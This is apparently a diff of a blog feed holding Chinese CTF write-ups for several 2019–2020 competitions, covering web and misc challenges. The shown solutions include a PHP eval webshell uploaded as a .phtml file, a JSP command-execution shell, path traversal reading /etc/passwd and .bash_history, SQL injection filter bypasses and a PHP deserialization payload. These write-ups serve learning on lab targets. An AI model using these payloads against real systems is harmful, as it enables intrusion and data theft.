 <h3 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h3><p>F12发现下面代码，get传参cat=dog即可</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$cat=$_GET[<span class="string">'cat'</span>];</span><br><span class="line">        <span class="keyword">echo</span> $cat;</span><br><span class="line">        <span class="keyword">if</span>($cat==<span class="string">'dog'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
 
 <h3 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h3><p>302重定向、filter伪协议</p>
 <p>拿到题跟着源代码走，发现有个302，bp抓一下包</p>
-<a href="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/2.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/2.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>访问secr3t.php，得到以下源码</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
@@ -211,7 +233,7 @@
 <p>最后构造</p>
 <p>select=O%3A4%3A”Name”%3A<strong><em>3</em></strong>%3A%7Bs%3A14%3A”%00Name%00username”%3Bs%3A5%3A”admin”%3Bs%3A14%3A”%00Name%00password”%3Bi%3A100%3B%7D，得到flag</p>
 <h3 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h3><p>一句话已经给出来了，拿菜刀连一下或者直接传参进行命令执行就好啦。在根目录下发现flag</p>
-<a href="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/3.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/3.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>然后再<code>cat /flag</code>就得到flag了</p>
 <h3 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h3><p>简单注入，先用万能密码登录一下，然后用order语句查表发现有三列</p>
@@ -224,7 +246,7 @@
 <p>最后访问后提示：No!!! you can only read this locally!!!，加一个XFF:127.0.0.1</p>
 <p>最后访问得到flag</p>
 <h3 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h3><p>首先尝试万能密码，发现or被过滤掉，双写绕过</p>
-<a href="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/4.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/4.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>登录成功，尝试联合注入，发现union、select、where、from被过滤</p>
 <p>注入代码如下：</p>
@@ -259,27 +281,27 @@
     <content><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h3><p>这个题主要考用php://filter伪协议进行文件包含</p>
 <p>进入题目发现url中有?file=flag.php，首先想到用php://伪协议来发送php代码，然后发现提示：<code>hacker!</code></p>
 <p>然后就想到用php://filter来读取flag.php文件base64源码</p>
-<a href="/2020/04/13/ACTF2020/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/13/ACTF2020/1.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/13/ACTF2020/1.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>base64解码后得到flag</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Can you find out the flag?"</span>;</span><br><span class="line"><span class="comment">//flag&#123;1d7f32d1-354d-4f5a-b1dd-cd41e002f741&#125;</span></span><br></pre></td></tr></table></figure></div>
 
 <h3 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h3><p>基础的命令执行</p>
-<a href="/2020/04/13/ACTF2020/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/13/ACTF2020/2.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/13/ACTF2020/2.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="BackupFile"><a href="#BackupFile" class="headerlink" title="BackupFile"></a>BackupFile</h3><p>备份文件、ezbypass</p>
 <p>题目名字提示已经bak文件了，我还是扫了一下。</p>
-<a href="/2020/04/13/ACTF2020/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/13/ACTF2020/3.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/13/ACTF2020/3.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>得到源码：</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
 <p>要满足是数字且的<code>$key == $str</code>因为php中string转int时会只保留数字，令<code>key=123</code>即可</p>
-<a href="/2020/04/13/ACTF2020/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/13/ACTF2020/4.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/13/ACTF2020/4.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p>JS前端验证、ph扩展名绕过</p>
 <p>本来以为要绕过前端验证，传.htaccess的发现它会自动加个前缀，无法实现解析功能，然后试着传了ph类的东西，发现phtml可以传上去</p>
-<a href="/2020/04/13/ACTF2020/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/04/13/ACTF2020/5.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/04/13/ACTF2020/5.png" src="/img/loading.gif" class="lazyload"></a>
 
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;1.phtml&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_REQUEST[&#39;pass&#39;]);?&gt;</span><br></pre></td></tr></table></figure></div>
 
@@ -301,7 +323,7 @@
 <p>Outguess解一下图片即可得到flag</p>
 <h3 id="swp"><a href="#swp" class="headerlink" title="swp"></a>swp</h3><p>导出http对象、伪加密、strings一下（或者vim -r</p>
 <p>wireshark导出http对象，然后010改一下伪加密，得到.flag.swp，strings输出得到flag，或者vim -r恢复一下swp文件得到flag：<code>actf{c5558bcf-26da-4f8b-b181-b61f3850b9e5}</code></p>
-<a href="/2020/04/13/ACTF2020/6.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/13/ACTF2020/6.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/13/ACTF2020/6.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h3><p>文件分离、明文攻击</p>
 <p>把woo.jpg里面的压缩包分离出来，然后根据这两个压缩包进行明文攻击</p>
@@ -311,7 +333,7 @@
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">steghide.exe extract -sf hh.jpg</span><br><span class="line">Enter passphrase:welcom3!</span><br><span class="line">wrote extracted data to &quot;secret.txt&quot;.</span><br><span class="line"></span><br><span class="line">secret.txt:</span><br><span class="line">想要flag吗？解出我的密文吧~</span><br><span class="line">U2FsdGVkX1&#x2F;7KeHVl5984OsGUVSanPfPednHpK9lKvp0kdrxO4Tj&#x2F;Q&#x3D;&#x3D;</span><br></pre></td></tr></table></figure></div>
 
 <p>在<code>hh.jpg</code>属性里找到密钥：<code>@#$%^&amp;%%$)</code></p>
-<a href="/2020/04/13/ACTF2020/7.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/13/ACTF2020/7.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/13/ACTF2020/7.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>提示stegosaurus隐写，其实直接file O_O就可以得到<code>O_O: python 3.6 byte-compiled</code>也能猜到pyc</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;stegosaurus -x O_O.pyc</span><br><span class="line">Extracted payload: flag&#123;3teg0Sauru3_!1&#125;</span><br></pre></td></tr></table></figure></div>
@@ -325,7 +347,7 @@
 
 <h3 id="music"><a href="#music" class="headerlink" title="music"></a>music</h3><p>文件异或</p>
 <p>有大量A1出现，本应该是00的所以整个文件于A1进行异或得到原本mp4文件</p>
-<a href="/2020/04/13/ACTF2020/8.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/13/ACTF2020/8.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/13/ACTF2020/8.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>收听音频得到flag</p>
 ]]></content>
@@ -334,8 +356,8 @@
       </categories>
       <tags>
         <tag>Write_up</tag>
-        <tag>Web</tag>
         <tag>misc</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -369,7 +391,7 @@
 <p>非预期就是通过任意文件下载来读/home/tomajp/.bashrc_history，从而得到执行生成flag时的存放位置，进而去读flag所在文件得到flag，但是在buu上由于是docker生成的所以不需要去通过tomajp用户去生产flag所以就无非预期了。(其实还有，如果你能猜到根目录下存放flag的文件的名字，不过基本不可能。。因为它叫<code>flag78bt787it8b9b098j0k80k0ggg</code></p>
 <p>非预期解还挺简单的:</p>
 <p>1.任意上传一个文件，然后用错误的文件名去读一下，文件路径就会暴露出来</p>
-<a href="/2020/04/02/WUSTCTF2020/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/3.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/3.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>2.<code>download?file=../../../../../../../etc/passwd</code>读到存在tomajp用户，然后下载它的bash_history文件 <code>download?file=../../../../../../../home/tomajp/.bash_history</code>发现执行过的命令，发现flag存放的文件夹，然后读取flag存放文件夹<code>download?file=../../../../../../../flaaaag/what_you_want</code>得到flag</p>
 <p>预期解：</p>
@@ -377,10 +399,10 @@
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">jsp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">java.io.InputStream in = Runtime.getRuntime().exec(<span class="string">"执行的命令"</span>).getInputStream();</span><br><span class="line"><span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line"><span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">	out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">&#125;</span><br><span class="line">out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">执行的命令:</span></span><br><span class="line"><span class="comment">ls -al \ 被这个\坑傻了自动把后面的"转译了报错字符串闭合问题，不懂java的我还以为是字符串里的空格问题，后来偶然看到转译\\r的时候才反应过来所以我把命令换成了ls -al /</span></span><br><span class="line"><span class="comment">cat /flag78bt787it8b9b098j0k80k0ggg</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>
 
 <p>2.通过AJP包含这个jsp文件，从而执行其中的代码（<a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487" target="_blank" rel="noopener">脚本地址</a></p>
-<a href="/2020/04/02/WUSTCTF2020/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/1.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/1.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>发现根目录下flag存放位置，读取得到flag</p>
-<a href="/2020/04/02/WUSTCTF2020/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/2.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/2.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>详细步骤：先把这个ajpShooter.py上传到buu的linux-lab的机子上，然后用这个脚本包含你上传的文件，最后通过各样式的命令执行得到flag。反弹shell那个jsp脚本我用不来。。（注意：<code>Lan Domain: 2554-169ec896-03d5-483f-97ca-369fbcc3bdbf</code>用的是局域网，用read可以去读取文件的内容，eval是输出文件执行的结果。</p>
 <p>最后有时间去复现一下这个漏洞<a href="https://www.liuyixiang.com/post/109123.html" target="_blank" rel="noopener">CVE-2020-1938</a></p>
@@ -391,7 +413,7 @@
 
 <p>对着九键键盘翻译一下得到flag：<code>flag{youaremygirlfriends}</code></p>
 <h3 id="find-me"><a href="#find-me" class="headerlink" title="find_me"></a>find_me</h3><p>看备注+<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen" target="_blank" rel="noopener">盲文转换</a></p>
-<a href="/2020/04/02/WUSTCTF2020/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/4.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/4.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="爬"><a href="#爬" class="headerlink" title="爬"></a>爬</h3><p>判断文件类型为pdf，用wps等工具打开，图片后面有另一个图片，得到字符串</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x77637466323032307b746831735f31735f405f7064665f616e645f7930755f63616e5f7573655f70686f7430736830707d</span><br></pre></td></tr></table></figure></div>
@@ -419,8 +441,8 @@
       </categories>
       <tags>
         <tag>Write_up</tag>
-        <tag>Web</tag>
         <tag>misc</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -431,24 +453,24 @@
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                     highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure></div>
 
 <p>用数组绕过md5，用数字+字符绕过is_numeric()+弱等于</p>
-<a href="/2020/03/30/MRCTF/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/1.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/1.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="PYWebsite"><a href="#PYWebsite" class="headerlink" title="PYWebsite"></a>PYWebsite</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">javascript</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enc</span>(<span class="params">code</span>)</span>&#123;</span><br><span class="line">  hash = hex_md5(code);</span><br><span class="line">  <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> code = <span class="built_in">document</span>.getElementById(<span class="string">"vcode"</span>).value;</span><br><span class="line">  <span class="keyword">if</span> (code != <span class="string">""</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(hex_md5(code) == <span class="string">"0cd4da0223c0b280829dc3ea458d655c"</span>)&#123;</span><br><span class="line">      alert(<span class="string">"您通过了验证！"</span>);</span><br><span class="line">      <span class="built_in">window</span>.location = <span class="string">"./flag.php"</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      alert(<span class="string">"你的授权码不正确！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    alert(<span class="string">"请输入授权码"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 <p>在源码里发现这段js，这题卡在md5好久。。淦，原来是不用解密的，就是个前端验证，而且还破解不出来md5的值</p>
 <p>直接访问/flag.php</p>
-<a href="/2020/03/30/MRCTF/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/2.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/2.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>构造X-Forwarded-For: 127.0.0.1，得到flag</p>
 <h3 id="你传你🐎呢"><a href="#你传你🐎呢" class="headerlink" title="你传你🐎呢"></a>你传你🐎呢</h3><p>服务器搁美国，给爷整傻了，本来题不是很难，这发包没响应给爷心态搞崩了，后来连上蚁剑后终于知道为啥网站卡了。。</p>
-<a href="/2020/03/30/MRCTF/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/30/MRCTF/3.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/30/MRCTF/3.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>开题一看就知道是老祖安人了</p>
-<a href="/2020/03/30/MRCTF/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/4.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/4.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>先上传个解析图片为php的.htaccess文件，改一下Content-Type，再传个图片🐎</p>
-<a href="/2020/03/30/MRCTF/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/5.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/5.png" src="/img/loading.gif" class="lazyload"></a>
 
-<a href="/2020/03/30/MRCTF/6.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/6.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/6.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>最后蚁剑连一下，得到flag</p>
 <h3 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h3><p>第一次遇到反序列化构造pop链的题，还是入门晚了嗷，构造了好久还是不会利用类之间的关系，看了wp才恍然大悟。。</p>
@@ -482,7 +504,7 @@
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">"php://filter/convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> Show(<span class="string">'abc'</span>);<span class="comment">//初始化一个Show类</span></span><br><span class="line">$a-&gt;str=<span class="keyword">new</span> 